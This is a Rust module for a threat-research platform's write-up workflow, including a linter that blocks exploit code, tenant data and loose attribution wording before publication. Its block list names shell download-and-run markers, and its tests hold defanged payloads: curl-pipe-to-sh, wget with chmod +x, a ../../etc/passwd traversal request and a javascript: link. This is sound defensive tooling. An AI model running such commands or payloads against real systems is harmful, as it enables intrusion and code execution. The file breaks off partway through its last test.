//! Research write-ups and public exploit pages (#35).
//!
//! A write-up moves `draft` -> `review` -> `approved` -> `published`, and a
//! published one can be `withdrawn`. Every change is a new version: the
//! API stores each version and audits each transition. The body is
//! Markdown, parsed by [`crate::markdown`] into a tree, never into HTML.
//!
//! [`lint`] enforces the house wording and privacy rules before a write-up
//! can be submitted, approved or published: "we assess as" for CVE links an
//! analyst has not confirmed, "possible association" for actors, no
//! "confirmed" without an analyst confirmation, no tenant data, no
//! non-documentation IP addresses, no runnable exploit code, no placeholders
//! and only safe links. [`public_page`] builds the public snapshot from an
//! allow-list of fields. See `docs/research-writeups.md`.

use std::collections::BTreeSet;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::markdown::{self, Block, Inline};
use crate::share::Tlp;

pub const MAX_TITLE_CHARS: usize = 160;
pub const MAX_SUMMARY_CHARS: usize = 400;
pub const MAX_PAYLOAD_CHARS: usize = 2_000;
pub const MAX_SLUG_CHARS: usize = 80;
/// Most CVE, technique, campaign, IOC or attempt ids on one write-up.
pub const MAX_REFS: usize = 50;
pub const MAX_NOTE_CHARS: usize = 1_000;
/// Longest code block, in lines, before lint calls it exploit code.
pub const MAX_CODE_LINES: usize = 20;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum WriteUpStatus {
    Draft,
    Review,
    Approved,
    Published,
    Withdrawn,
}

impl WriteUpStatus {
    pub fn as_str(self) -> &'static str {
        match self {
            WriteUpStatus::Draft => "draft",
            WriteUpStatus::Review => "review",
            WriteUpStatus::Approved => "approved",
            WriteUpStatus::Published => "published",
            WriteUpStatus::Withdrawn => "withdrawn",
        }
    }

    pub fn parse(s: &str) -> Option<Self> {
        use WriteUpStatus::*;
        [Draft, Review, Approved, Published, Withdrawn]
            .into_iter()
            .find(|x| x.as_str() == s)
    }
}

/// The second reviewer's checklist (#35). Every item must be true to
/// approve.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Checklist {
    /// No tenant ids, customer names, sensor or decoy ids, hostnames or
    /// personal information.
    pub tenant_data_removed: bool,
    /// "we assess as", "possible association", and "confirmed" only where
    /// an analyst confirmed.
    pub wording_checked: bool,
    /// No working exploit code or runnable commands.
    pub no_exploit_code: bool,
    /// Payload excerpts are redacted: secrets masked, commands defanged.
    pub payloads_redacted: bool,
    /// Every claim about a CVE or advisory links its public source.
    pub sources_linked: bool,
    /// IOCs go out only through the delayed, confirmed public IOC list
    /// (`docs/contribute-back.md`), never pasted into the body.
    pub delay_rules_checked: bool,
}

impl Checklist {
    pub fn complete(&self) -> bool {
        self.tenant_data_removed
            && self.wording_checked
            && self.no_exploit_code
            && self.payloads_redacted
            && self.sources_linked
            && self.delay_rules_checked
    }
}

/// One research write-up. Mirrors `schemas/write-up.schema.json`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WriteUp {
    /// `wu_` plus 24 hex characters.
    pub writeup_id: String,
    pub tenant_id: String,
    /// Public path segment: `/exploited/<slug>`.
    pub slug: String,
    pub title: String,
    pub summary: String,
    /// Markdown subset (`crate::markdown`). Never rendered as HTML.
    pub body_md: String,
    pub status: WriteUpStatus,
    pub tlp: Tlp,
    /// Not shown publicly before this time (Unix ms), even when published.
    pub embargo_until: Option<i64>,
    pub cve_ids: Vec<String>,
    pub technique_ids: Vec<String>,
    pub campaign_ids: Vec<String>,
    /// IOCs to release with the page. Each still needs an approved review
    /// queue item and the delay from the share policy (#37).
    pub ioc_ids: Vec<String>,
    /// Attempts the write-up is about. Used for the timeline and to find
    /// analyst confirmations; never published.
    pub attempt_ids: Vec<String>,
    /// First sighting on Foiled sensors (Unix ms), when known.
    pub first_seen: Option<i64>,
    /// A short excerpt, redacted on save (`crate::redact`) and checked by
    /// lint. Shown as plain text.
    pub redacted_payload: Option<String>,
    /// The review queue item this draft was promoted from.
    pub source_item_id: Option<String>,
    pub author_id: String,
    pub reviewer_id: Option<String>,
    pub checklist: Option<Checklist>,
    pub version: u32,
    pub created_at: i64,
    pub updated_at: i64,
    pub submitted_at: Option<i64>,
    pub approved_at: Option<i64>,
    pub published_at: Option<i64>,
    pub withdrawn_at: Option<i64>,
}

/// `wu_` plus 24 hex characters from a random seed.
pub fn writeup_id(seed: &str) -> String {
    let h = Sha256::digest(format!("writeup\n{seed}").as_bytes());
    format!("wu_{}", hex::encode(&h[..12]))
}

pub fn valid_writeup_id(id: &str) -> bool {
    id.strip_prefix("wu_").is_some_and(|h| {
        h.len() == 24
            && h.bytes()
                .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
    })
}

/// Lowercase letters and digits in hyphen-separated words.
pub fn valid_slug(slug: &str) -> bool {
    !slug.is_empty()
        && slug.len() <= MAX_SLUG_CHARS
        && slug.split('-').all(|w| {
            !w.is_empty()
                && w.bytes()
                    .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
        })
}

/// Upper-cased CVE or FOILED-DEMO id, if `s` is one.
pub fn normalise_cve(s: &str) -> Option<String> {
    let u = s.trim().to_ascii_uppercase();
    let ok = if let Some(rest) = u.strip_prefix("CVE-") {
        let (year, num) = rest.split_once('-')?;
        year.len() == 4
            && year.bytes().all(|b| b.is_ascii_digit())
            && (4..=7).contains(&num.len())
            && num.bytes().all(|b| b.is_ascii_digit())
    } else if let Some(num) = u.strip_prefix("FOILED-DEMO-") {
        num.len() == 4 && num.bytes().all(|b| b.is_ascii_digit())
    } else {
        false
    };
    ok.then_some(u)
}

/// ATT&CK technique id (`T1190`, `T1059.004`), upper-cased.
pub fn normalise_technique(s: &str) -> Option<String> {
    let u = s.trim().to_ascii_uppercase();
    let rest = u.strip_prefix('T')?;
    let (main, sub) = match rest.split_once('.') {
        Some((m, s)) => (m, Some(s)),
        None => (rest, None),
    };
    let digits = |x: &str, n: usize| x.len() == n && x.bytes().all(|b| b.is_ascii_digit());
    (digits(main, 4) && sub.is_none_or(|s| digits(s, 3))).then_some(u)
}

/// Allowed moves. Edits happen only in `draft`.
pub fn transition_allowed(from: WriteUpStatus, to: WriteUpStatus) -> bool {
    use WriteUpStatus::*;
    matches!(
        (from, to),
        (Draft, Review)
            | (Review, Draft)
            | (Review, Approved)
            | (Approved, Draft)
            | (Approved, Published)
            | (Published, Withdrawn)
    )
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    /// Blocks submit, approve and publish.
    Error,
    Warning,
}

/// One lint result. Mirrors `schemas/write-up.schema.json#/$defs/finding`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Finding {
    pub rule: String,
    pub severity: Severity,
    /// `title`, `summary`, `slug`, `redacted_payload` or `body block N`
    /// (1-based).
    pub location: String,
    pub message: String,
}

/// What lint needs to know beyond the write-up.
#[derive(Debug, Clone, Default)]
pub struct LintContext {
    /// Every tenant id that must never appear (at least the owner's).
    pub tenant_ids: Vec<String>,
    /// CVE and technique ids, upper-cased, with an analyst confirmation
    /// (#27) on one of the write-up's attempts.
    pub confirmed: BTreeSet<String>,
}

/// Words split on anything that is not a letter, digit, `-`, `.` or `_`.
fn tokens(text: &str) -> impl Iterator<Item = &str> {
    text.split(|c: char| !(c.is_alphanumeric() || matches!(c, '-' | '.' | '_')))
        .map(|t| t.trim_matches(|c: char| matches!(c, '.' | '-' | '_')))
        .filter(|t| !t.is_empty())
}

fn cves_in(text: &str) -> BTreeSet<String> {
    tokens(text).filter_map(normalise_cve).collect()
}

fn techniques_in(text: &str) -> BTreeSet<String> {
    tokens(text).filter_map(normalise_technique).collect()
}

/// RFC 5737 documentation ranges, the only addresses allowed in prose.
fn documentation_ip(o: [u8; 4]) -> bool {
    matches!(o, [192, 0, 2, _] | [198, 51, 100, _] | [203, 0, 113, _])
}

fn ipv4s(text: &str) -> Vec<[u8; 4]> {
    let undefanged = text.replace("[.]", ".").replace("(.)", ".");
    undefanged
        .split(|c: char| !(c.is_ascii_digit() || c == '.'))
        .filter_map(|t| {
            let parts: Vec<&str> = t.trim_matches('.').split('.').collect();
            if parts.len() != 4 {
                return None;
            }
            let mut o = [0u8; 4];
            for (i, p) in parts.iter().enumerate() {
                if p.is_empty() || p.len() > 3 {
                    return None;
                }
                o[i] = p.parse().ok()?;
            }
            Some(o)
        })
        .collect()
}

fn looks_like_email(text: &str) -> bool {
    text.split_whitespace().any(|w| {
        let w = w.trim_matches(|c: char| !c.is_alphanumeric());
        match w.split_once('@') {
            Some((user, domain)) => {
                !user.is_empty()
                    && domain.contains('.')
                    && domain.split('.').all(|p| {
                        !p.is_empty() && p.chars().all(|c| c.is_alphanumeric() || c == '-')
                    })
            }
            None => false,
        }
    })
}

/// Whether `needle` appears in `haystack` as a whole token: not inside a
/// longer word, so the tenant `t1` does not match `T1190`. Both lowercase.
pub fn contains_token(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return false;
    }
    let word = |c: char| c.is_alphanumeric() || c == '_' || c == '-';
    haystack.match_indices(needle).any(|(i, _)| {
        let before = haystack[..i].chars().next_back();
        let after = haystack[i + needle.len()..].chars().next();
        !before.is_some_and(word) && !after.is_some_and(word)
    })
}

/// Internal ids that tie text to one tenant's fleet.
fn internal_ids(text: &str) -> bool {
    tokens(text).any(|t| {
        ["att_", "rq_", "wu_"].iter().any(|p| {
            t.strip_prefix(p)
                .is_some_and(|h| h.len() == 24 && h.bytes().all(|b| b.is_ascii_hexdigit()))
        })
    })
}

const PLACEHOLDERS: &[&str] = &["todo", "tbd", "fixme", "xxx", "lorem", "placeholder"];

/// Words that make a sentence about a threat actor. `APT` followed by
/// digits counts too.
const ACTOR_WORDS: &[&str] = &[
    "actor",
    "actors",
    "attributed",
    "attribution",
    "nexus",
    "state-sponsored",
];

/// Commands and markers that make a code block or excerpt runnable.
const COMMAND_MARKERS: &[&str] = &[
    "curl ",
    "wget ",
    "/bin/sh",
    "/bin/bash",
    "bash -c",
    "sh -c",
    "powershell",
    "nc -e",
    "ncat ",
    "python -c",
    "perl -e",
    "eval(",
    "base64 -d",
    "chmod +x",
    "| sh",
    "|sh",
    "import socket",
    "<?php",
];

const EXPLOIT_LANGUAGES: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "shell",
    "console",
    "python",
    "py",
    "ruby",
    "rb",
    "perl",
    "php",
    "powershell",
    "ps1",
    "js",
    "javascript",
    "c",
    "cpp",
    "go",
    "rust",
    "java",
];

struct Linter<'a> {
    ctx: &'a LintContext,
    findings: Vec<Finding>,
}

impl Linter<'_> {
    fn push(&mut self, rule: &str, severity: Severity, location: &str, message: String) {
        self.findings.push(Finding {
            rule: rule.to_string(),
            severity,
            location: location.to_string(),
            message,
        });
    }

    /// Rules for one unit of prose: a title, a summary, or one block.
    fn prose(&mut self, location: &str, text: &str) {
        let lower = text.to_lowercase();
        // "not confirmed" and "not yet confirmed" are fine; any other use
        // of the word needs an analyst confirmation.
        let uses = tokens(&lower)
            .filter(|t| *t == "confirmed" || *t == "confirm")
            .count();
        let negated =
            lower.matches("not confirmed").count() + lower.matches("not yet confirmed").count();
        let confirmed_word = uses > negated;
        let cves = cves_in(text);
        let techniques = techniques_in(text);
        let unconfirmed: Vec<&String> = cves
            .iter()
            .filter(|c| !self.ctx.confirmed.contains(*c))
            .collect();
        if !unconfirmed.is_empty() && !lower.contains("we assess as") {
            self.push(
                "assessed-wording",
                Severity::Error,
                location,
                format!(
                    "{} is not confirmed by an analyst: say \"we assess as\" in the same paragraph",
                    unconfirmed
                        .iter()
                        .map(|s| s.as_str())
                        .collect::<Vec<_>>()
                        .join(", ")
                ),
            );
        }
        if confirmed_word {
            let named: Vec<&String> = cves.iter().chain(techniques.iter()).collect();
            let all_confirmed =
                !named.is_empty() && named.iter().all(|n| self.ctx.confirmed.contains(*n));
            if !all_confirmed {
                self.push(
                    "confirmed-without-analyst",
                    Severity::Error,
                    location,
                    "\"confirmed\" is only for a CVE or technique an analyst confirmed, named in the same paragraph".into(),
                );
            }
        }
        let actor = tokens(&lower).any(|t| {
            ACTOR_WORDS.contains(&t)
                || t.strip_prefix("apt")
                    .is_some_and(|n| !n.is_empty() && n.bytes().all(|b| b.is_ascii_digit()))
        });
        if actor && !lower.contains("possible association") {
            self.push(
                "actor-wording",
                Severity::Error,
                location,
                "actor links are a \"possible association\" and must say so in the same paragraph"
                    .into(),
            );
        }
        for t in &self.ctx.tenant_ids {
            if contains_token(&lower, &t.to_lowercase()) {
                self.push(
                    "tenant-data",
                    Severity::Error,
                    location,
                    "contains a tenant id: remove all tenant data".into(),
                );
            }
        }
        if lower.contains("tenant_id") || internal_ids(&lower) {
            self.push(
                "tenant-data",
                Severity::Error,
                location,
                "contains an internal id or tenant field: remove it".into(),
            );
        }
        if looks_like_email(text) {
            self.push(
                "personal-information",
                Severity::Error,
                location,
                "contains an email address: remove personal information".into(),
            );
        }
        if ipv4s(text).into_iter().any(|o| !documentation_ip(o)) {
            self.push(
                "ip-address",
                Severity::Error,
                location,
                "contains an IP address outside the documentation ranges: indicators are released through the delayed IOC list, not the body".into(),
            );
        }
        if tokens(&lower).any(|t| PLACEHOLDERS.contains(&t)) || lower.contains("[insert") {
            self.push(
                "placeholder",
                Severity::Error,
                location,
                "contains a placeholder (TODO, TBD, lorem and similar)".into(),
            );
        }
        if text.contains('\u{2014}') {
            self.push(
                "em-dash",
                Severity::Error,
                location,
                "house style has no em dashes: use a comma, colon or full stop".into(),
            );
        }
        let bytes = text.as_bytes();
        let raw_html = bytes
            .windows(2)
            .any(|w| w[0] == b'<' && (w[1].is_ascii_alphabetic() || w[1] == b'/' || w[1] == b'!'));
        if raw_html {
            self.push(
                "raw-html",
                Severity::Error,
                location,
                "raw HTML is not allowed: it is shown as text, never rendered".into(),
            );
        }
    }

    /// Only the privacy rules, for code and payload excerpts: those are
    /// attacker text, so wording rules do not apply to them.
    fn privacy(&mut self, location: &str, text: &str) {
        let mut inner = Linter {
            ctx: self.ctx,
            findings: Vec::new(),
        };
        inner.prose(location, text);
        self.findings.extend(inner.findings.into_iter().filter(|f| {
            matches!(
                f.rule.as_str(),
                "tenant-data" | "personal-information" | "ip-address" | "placeholder"
            )
        }));
    }

    fn runnable(&mut self, location: &str, text: &str) {
        let lower = text.to_lowercase();
        if let Some(m) = COMMAND_MARKERS.iter().find(|m| lower.contains(**m)) {
            self.push(
                "exploit-code",
                Severity::Error,
                location,
                format!(
                    "looks runnable ({}): mask it with [REDACTED] or defang it",
                    m.trim()
                ),
            );
        }
    }
}

/// Check a write-up against the wording, privacy and safety rules.
/// Findings are in a stable order: fields, then body blocks in order.
pub fn lint(w: &WriteUp, ctx: &LintContext) -> Vec<Finding> {
    let mut l = Linter {
        ctx,
        findings: Vec::new(),
    };
    if !valid_slug(&w.slug) {
        l.push(
            "slug",
            Severity::Error,
            "slug",
            "slug must be lowercase letters and digits in hyphen-separated words, at most 80 characters".into(),
        );
    }
    for (field, value, max) in [
        ("title", &w.title, MAX_TITLE_CHARS),
        ("summary", &w.summary, MAX_SUMMARY_CHARS),
    ] {
        if value.trim().is_empty() {
            l.push(
                "required",
                Severity::Error,
                field,
                format!("{field} is required"),
            );
        } else if value.chars().count() > max {
            l.push(
                "length",
                Severity::Error,
                field,
                format!("{field} must be at most {max} characters"),
            );
        }
        l.prose(field, value);
    }
    if w.body_md.len() > markdown::MAX_BODY_BYTES {
        l.push(
            "length",
            Severity::Error,
            "body",
            format!("body must be at most {} bytes", markdown::MAX_BODY_BYTES),
        );
    }
    // Fenced code languages are dropped by the parser, so read them here.
    for line in w.body_md.lines() {
        if let Some(lang) = line.trim_start().strip_prefix("```") {
            let lang = lang.trim().to_ascii_lowercase();
            if EXPLOIT_LANGUAGES.contains(&lang.as_str()) {
                l.push(
                    "exploit-code",
                    Severity::Error,
                    "body",
                    format!("code blocks in {lang} are not allowed: no working exploit code"),
                );
            }
        }
    }
    let blocks = markdown::parse(&w.body_md);
    if blocks.len() >= markdown::MAX_BLOCKS {
        l.push(
            "length",
            Severity::Error,
            "body",
            format!("body must have fewer than {} blocks", markdown::MAX_BLOCKS),
        );
    }
    let mut links = 0;
    for (n, b) in blocks.iter().enumerate() {
        let location = format!("body block {}", n + 1);
        let units: Vec<&[Inline]> = match b {
            Block::Heading { inlines, .. }
            | Block::Paragraph { inlines }
            | Block::Quote { inlines } => vec![inlines.as_slice()],
            Block::List { items, .. } => items.iter().map(Vec::as_slice).collect(),
            Block::Code { text } => {
                if text.lines().count() > MAX_CODE_LINES {
                    l.push(
                        "exploit-code",
                        Severity::Error,
                        &location,
                        format!(
                            "code blocks longer than {MAX_CODE_LINES} lines are not allowed: excerpt and redact"
                        ),
                    );
                }
                l.runnable(&location, text);
                l.privacy(&location, text);
                vec![]
            }
            Block::Rule => vec![],
        };
        for inlines in units {
            links += inlines
                .iter()
                .filter(|i| matches!(i, Inline::Link { .. }))
                .count();
            l.prose(&location, &markdown::inline_text(inlines));
            // The page renders link targets too: hold them to the same
            // privacy rules, decoded so %40 or %2E hide nothing, and split at
            // URL delimiters so `a@b.example&ref=1` still reads as an email.
            for i in inlines {
                if let Inline::Link { href, .. } = i {
                    let parts = percent_decode(href).replace(['/', '?', '&', '=', '#'], " ");
                    l.privacy(&location, &parts);
                }
            }
        }
    }
    // Links the parser dropped as unsafe.
    let raw_links = w.body_md.matches("](").count();
    if raw_links > links {
        l.push(
            "unsafe-link",
            Severity::Error,
            "body",
            "only https:// and site-relative links are kept: fix or remove the others".into(),
        );
    }
    if !w.cve_ids.is_empty() && links == 0 {
        l.push(
            "sources",
            Severity::Error,
            "body",
            "link at least one public source (advisory, NVD, vendor) for the CVEs".into(),
        );
    }
    if let Some(p) = &w.redacted_payload {
        if p.chars().count() > MAX_PAYLOAD_CHARS {
            l.push(
                "length",
                Severity::Error,
                "redacted_payload",
                format!("redacted_payload must be at most {MAX_PAYLOAD_CHARS} characters"),
            );
        }
        l.runnable("redacted_payload", p);
        l.privacy("redacted_payload", p);
    }
    if w.tlp != Tlp::Clear {
        l.push(
            "tlp",
            Severity::Warning,
            "tlp",
            "only TLP:CLEAR write-ups can be published on public pages".into(),
        );
    }
    l.findings
}

/// `%XX` escapes decoded, `+` read as a space. Invalid escapes stay as
/// they are; bytes that are not UTF-8 become U+FFFD.
fn percent_decode(s: &str) -> String {
    let b = s.as_bytes();
    let hex = |c: u8| (c as char).to_digit(16).map(|d| d as u8);
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        match (
            b[i],
            b.get(i + 1).copied().and_then(hex),
            b.get(i + 2).copied().and_then(hex),
        ) {
            (b'%', Some(h), Some(l)) => {
                out.push(h << 4 | l);
                i += 3;
            }
            (b'+', ..) => {
                out.push(b' ');
                i += 1;
            }
            (c, ..) => {
                out.push(c);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

pub fn has_errors(findings: &[Finding]) -> bool {
    findings.iter().any(|f| f.severity == Severity::Error)
}

/// How a CVE or technique is worded on a public page.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PublicAssessment {
    pub id: String,
    /// `we assess as` or `confirmed`.
    pub wording: String,
    /// When an analyst confirmed it, if they did.
    pub confirmed_at: Option<i64>,
    /// When the public advisory was published, for CVEs with one.
    pub advisory_published_at: Option<i64>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TimelineKind {
    FirstSeen,
    AdvisoryPublished,
    Confirmed,
    Published,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PublicTimelineEntry {
    /// Unix ms.
    pub at: i64,
    pub kind: TimelineKind,
    pub label: String,
}

/// One released indicator. Only defanged display text, the type and the
/// day it was first seen; never the raw value, tenant, sensor or attempt.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PublicIoc {
    #[serde(rename = "type")]
    pub ioc_type: String,
    pub display: String,
    /// UTC midnight of the first sighting (Unix ms).
    pub first_seen_day: i64,
    /// Not shown before this time (the share policy delay).
    pub release_at: i64,
    pub tlp: Tlp,
}

/// The public exploit page. Mirrors `schemas/public-exploit-page.schema.json`.
/// Built only by [`public_page`], from an allow-list of fields.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PublicPage {
    pub slug: String,
    pub canonical_path: String,
    pub title: String,
    pub summary: String,
    pub body: Vec<Block>,
    pub tlp: Tlp,
    pub published_at: i64,
    /// When the page becomes visible: the later of publish and embargo.
    pub visible_from: i64,
    pub version: u32,
    pub cves: Vec<PublicAssessment>,
    pub techniques: Vec<PublicAssessment>,
    pub timeline: Vec<PublicTimelineEntry>,
    pub redacted_payload: Option<String>,
    pub iocs: Vec<PublicIoc>,
}

/// A row in the public list of exploit pages.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PublicPageSummary {
    pub slug: String,
    pub canonical_path: String,
    pub title: String,
    pub summary: String,
    pub visible_from: i64,
    pub cves: Vec<PublicAssessment>,
}

impl PublicPage {
    pub fn summary_row(&self) -> PublicPageSummary {
        PublicPageSummary {
            slug: self.slug.clone(),
            canonical_path: self.canonical_path.clone(),
            title: self.title.clone(),
            summary: self.summary.clone(),
            visible_from: self.visible_from,
            cves: self.cves.clone(),
        }
    }

    /// The page as a reader sees it at `now`: IOCs still held back by the
    /// delay are removed.
    pub fn as_of(mut self, now: i64) -> Self {
        self.iocs.retain(|i| i.release_at <= now);
        self
    }
}

/// Facts the API gathers for [`public_page`].
#[derive(Debug, Clone, Default)]
pub struct PageFacts {
    /// Upper-cased id to the time an analyst confirmed it.
    pub confirmed_at: std::collections::BTreeMap<String, i64>,
    /// Upper-cased CVE id to its advisory publish time.
    pub advisories: std::collections::BTreeMap<String, i64>,
    /// Indicators cleared for release, already filtered by the share policy.
    pub iocs: Vec<PublicIoc>,
}

/// Build the public snapshot. Copies only allow-listed fields: no tenant,
/// author, reviewer, attempt, campaign or IOC ids. The caller must have
/// checked the status, TLP and lint first.
pub fn public_page(w: &WriteUp, facts: &PageFacts, published_at: i64) -> PublicPage {
    let assess = |id: &String, advisory: bool| PublicAssessment {
        id: id.clone(),
        wording: if facts.confirmed_at.contains_key(id) {
            "confirmed".into()
        } else {
            "we assess as".into()
        },
        confirmed_at: facts.confirmed_at.get(id).copied(),
        advisory_published_at: if advisory {
            facts.advisories.get(id).copied()
        } else {
            None
        },
    };
    let cves: Vec<PublicAssessment> = w.cve_ids.iter().map(|c| assess(c, true)).collect();
    let techniques: Vec<PublicAssessment> =
        w.technique_ids.iter().map(|t| assess(t, false)).collect();
    let mut timeline = Vec::new();
    if let Some(at) = w.first_seen {
        timeline.push(PublicTimelineEntry {
            at,
            kind: TimelineKind::FirstSeen,
            label: "First seen on Foiled sensors".into(),
        });
    }
    for c in &cves {
        if let Some(at) = c.advisory_published_at {
            timeline.push(PublicTimelineEntry {
                at,
                kind: TimelineKind::AdvisoryPublished,
                label: format!("Advisory published for {}", c.id),
            });
        }
        if let Some(at) = c.confirmed_at {
            timeline.push(PublicTimelineEntry {
                at,
                kind: TimelineKind::Confirmed,
                label: format!("Analyst confirmed attempts against {}", c.id),
            });
        }
    }
    let visible_from = published_at.max(w.embargo_until.unwrap_or(i64::MIN));
    timeline.push(PublicTimelineEntry {
        at: visible_from,
        kind: TimelineKind::Published,
        label: "Published".into(),
    });
    timeline.sort_by_key(|t| (t.at, t.kind as u8));
    PublicPage {
        canonical_path: format!("/exploited/{}", w.slug),
        slug: w.slug.clone(),
        title: crate::timeline::printable(&w.title),
        summary: crate::timeline::printable(&w.summary),
        body: markdown::parse(&w.body_md),
        tlp: w.tlp,
        published_at,
        visible_from,
        version: w.version,
        cves,
        techniques,
        timeline,
        redacted_payload: w
            .redacted_payload
            .as_deref()
            .map(|p| crate::redact::redact(p).0),
        iocs: facts.iocs.clone(),
    }
}

/// Last line of defence before a page is stored: true when a tenant id
/// appears anywhere in the serialised page, or a never-shared key does.
pub fn page_leaks(page: &PublicPage, tenant_ids: &[String]) -> bool {
    let json = serde_json::to_value(page).unwrap_or(serde_json::Value::Null);
    let text = json.to_string().to_lowercase();
    if tenant_ids
        .iter()
        .any(|t| contains_token(&text, &t.to_lowercase()))
    {
        return true;
    }
    let mut copy = match json {
        serde_json::Value::Object(m) => m,
        _ => return true,
    };
    crate::share::strip_non_shareable(&mut copy) > 0
}

#[cfg(test)]
mod tests {
    use super::*;

    pub(crate) fn sample() -> WriteUp {
        WriteUp {
            writeup_id: writeup_id("seed"),
            tenant_id: "tenant-demo".into(),
            slug: "demo-app-path-traversal".into(),
            title: "Path traversal attempts against Demo App".into(),
            summary: "We assess as attempts against FOILED-DEMO-0001 from several sources.".into(),
            body_md: "## What we saw\n\nWe assess as attempts against FOILED-DEMO-0001. Source: [advisory](https://advisories.example.invalid/FOILED-DEMO-0001).\n".into(),
            status: WriteUpStatus::Draft,
            tlp: Tlp::Clear,
            embargo_until: None,
            cve_ids: vec!["FOILED-DEMO-0001".into()],
            technique_ids: vec!["T1190".into()],
            campaign_ids: vec![],
            ioc_ids: vec![],
            attempt_ids: vec![],
            first_seen: Some(1_000),
            redacted_payload: Some("GET /download?file=../../etc/passwd HTTP/1.1".into()),
            source_item_id: None,
            author_id: "tok_author".into(),
            reviewer_id: None,
            checklist: None,
            version: 1,
            created_at: 1,
            updated_at: 1,
            submitted_at: None,
            approved_at: None,
            published_at: None,
            withdrawn_at: None,
        }
    }

    fn ctx() -> LintContext {
        LintContext {
            tenant_ids: vec!["tenant-demo".into()],
            confirmed: BTreeSet::new(),
        }
    }

    fn rules(w: &WriteUp, c: &LintContext) -> Vec<String> {
        lint(w, c).into_iter().map(|f| f.rule).collect()
    }

    #[test]
    fn clean_sample_passes() {
        assert_eq!(lint(&sample(), &ctx()), vec![]);
    }

    #[test]
    fn unconfirmed_cve_needs_we_assess_as_and_confirmed_needs_an_analyst() {
        let mut w = sample();
        w.body_md =
            "Attempts against FOILED-DEMO-0001 were confirmed. [src](https://a.example.invalid/)"
                .into();
        let r = rules(&w, &ctx());
        assert!(r.contains(&"assessed-wording".to_string()), "{r:?}");
        assert!(
            r.contains(&"confirmed-without-analyst".to_string()),
            "{r:?}"
        );
        let mut c = ctx();
        c.confirmed.insert("FOILED-DEMO-0001".into());
        assert_eq!(rules(&w, &c), Vec::<String>::new());
        // Confirming one CVE does not license "confirmed" for another.
        w.body_md = "Attempts against FOILED-DEMO-0001 and CVE-2099-0001 were confirmed, we assess as. [src](https://a.example.invalid/)".into();
        assert!(rules(&w, &c).contains(&"confirmed-without-analyst".to_string()));
    }

    #[test]
    fn actor_text_needs_possible_association() {
        let mut w = sample();
        w.body_md
            .push_str("\nThis activity is attributed to APT99.\n");
        assert!(rules(&w, &ctx()).contains(&"actor-wording".to_string()));
        w.body_md = w.body_md.replace(
            "attributed to APT99",
            "a possible association with a public cluster, not attributed",
        );
        assert!(!rules(&w, &ctx()).contains(&"actor-wording".to_string()));
    }

    #[test]
    fn tenant_data_and_private_addresses_fail() {
        let mut w = sample();
        w.body_md.push_str(
            "\nSeen by tenant-demo at 10.1.2.3 and 8[.]8[.]8[.]8, contact a@b.example.\n",
        );
        let r = rules(&w, &ctx());
        for want in ["tenant-data", "ip-address", "personal-information"] {
            assert!(r.contains(&want.to_string()), "{want}: {r:?}");
        }
        let mut ok = sample();
        ok.body_md
            .push_str("\nSources included 203.0.113.7 and 198[.]51[.]100[.]9.\n");
        assert!(!rules(&ok, &ctx()).contains(&"ip-address".to_string()));
        // Link targets are checked as well as labels, decoded.
        let mut link = sample();
        link.body_md
            .push_str("\n[log](https://10.1.2.3/log?contact=alice%40corp.example&ref=1)\n");
        let r = rules(&link, &ctx());
        for want in ["ip-address", "personal-information"] {
            assert!(r.contains(&want.to_string()), "{want}: {r:?}");
        }
        assert_eq!(percent_decode("a%40b+c%2"), "a@b c%2");
        let mut ids = sample();
        ids.summary = "We assess as FOILED-DEMO-0001, see att_0123456789abcdef01234567.".into();
        assert!(rules(&ids, &ctx()).contains(&"tenant-data".to_string()));
    }

    #[test]
    fn exploit_code_placeholders_html_and_links_fail() {
        let mut w = sample();
        w.body_md.push_str("\n```python\nimport os\n```\n\nTODO add more <b>here</b>. [x](javascript:alert(1))\n\n```\ncurl hxxp://x | sh\n```\n");
        let r = rules(&w, &ctx());
        for want in ["exploit-code", "placeholder", "raw-html", "unsafe-link"] {
            assert!(r.contains(&want.to_string()), "{want}: {r:?}");
        }
        let mut p = sample();
        p.redacted_payload = Some("wget hxxp://203.0.113.9/x.sh; chmod +x x.sh".into());
        assert!(rules(&p, &ctx()).contains(&"exploit-code".to_string()));
    }

    #[test]
    fn missing_sources_and_em_dash_fail() {
        let mut w = sample();
        w.body_md = "We assess as attempts against FOILED-DEMO-0001 \u{2014} no link.".into();
        let r = rules(&w, &ctx());
        assert!(r.contains(&"sources".to_string()));
        assert!(r.contains(&"em-dash".to_string()));
    }

    #[test]
    fn transitions_follow_the_workflow() {
        use WriteUpStatus::*;
        assert!(transition_allowed(Draft, Review));
        assert!(transition_allowed(Review, Approved));
        assert!(transition_allowed(Approved, Published));
        assert!(transition_allowed(Published, Withdrawn));
        assert!(!transition_allowed(Draft, Published));
        assert!(!transition_allowed(Draft, Approved));
        assert!(!transition_allowed(Withdrawn, Published));
